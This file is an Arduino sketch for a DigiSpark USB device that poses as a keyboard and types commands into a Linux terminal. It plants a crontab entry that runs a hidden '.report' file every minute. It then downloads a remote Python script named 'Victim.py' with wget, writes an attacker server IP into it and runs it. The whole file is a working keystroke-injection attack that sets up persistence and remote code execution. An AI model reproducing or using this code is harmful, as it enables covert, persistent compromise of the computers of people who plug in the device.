#include "DigiKeyboard.h"

boolean didRun = false;

void setup() {
  // put your setup code here, to run once:

}


void loop() {
  // put your main code here, to run repeatedly:
  while(!didRun){
    //LED turns on when the program starts
    digitalWrite(LED_BUILTIN, HIGH);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.println("crontab -e");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
    DigiKeyboard.print("* * * * * python ~/Documents/.report");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_Y);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.println("cd ~/Documents; wget -O .report https://raw.githubusercontent.com/Kaiden-Timm/DigiKeyboard-project/main/Victim.py");
    //6, 15
    DigiKeyboard.delay(500);
    //Wrote for nano, not really sure why but you can change it to vim by changing nano to vim and adding an I keypress before you write the server IP into the file
    DigiKeyboard.println("nano ~/Documents/.report");
    for(int i = 0; i < 6; i++){
      DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
    }
    for(int i = 0; i < 15; i++){
      DigiKeyboard.sendKeyStroke(KEY_RIGHT_ARROW);
    }
    //replace with your server IPs
    DigiKeyboard.print("0.0.0.0");

    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_Y);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.println("python ~/Documents/.report");
    //LED turns off when its done
    digitalWrite(LED_BUILTIN, LOW);
    didRun = true;
  }
}
